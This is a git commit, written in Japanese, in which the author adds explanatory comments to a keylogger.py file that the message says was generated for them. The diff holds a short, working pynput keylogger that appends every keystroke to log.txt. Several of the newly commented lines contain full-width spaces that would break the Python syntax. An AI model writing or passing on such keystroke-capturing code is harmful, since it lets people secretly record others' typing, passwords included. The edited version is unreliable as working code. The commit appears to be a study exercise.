d70a4a83d77ebfd59104e5da5a87fa49e305ab69
ぷらずま <zuxhxb@gmail.com>
2025-10-04 10:44:41 +0900

    keylogger.py の更新
    生成されたキーロガーを自分なりに追うために、コメントアウトでコードを推論した

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,13 @@
-from pynput import keyboard
+from pynput import keyboard #モジュールpynput
 
-def on_press(key):
+def on_press(key):#関数　キーロガーのメインロジック
     try:
-        with open("log.txt", "a") as f:
-            f.write(str(key.char))
-    except AttributeError:
-        with open("log.txt", "a") as f:
-            f.write(str(key))
+        with open("log.txt", "a")　 as f: #ログをTextとして生成
 
-with keyboard.Listener(on_press=on_press) as listener:
+            f.write(str(key.char)) #生のキー入力を文字列に変換
+    except AttributeError: #異種のキー入力エラー
+        with open("log.txt", "a") as f: #そのままログとして出力　fは一時的な変数
+            f.write(str(key))　#生のキー入力を文字列として出力
+
+with keyboard.Listener(on_press=on_press) as listener:　#動き続けるためのロジック
     listener.join()
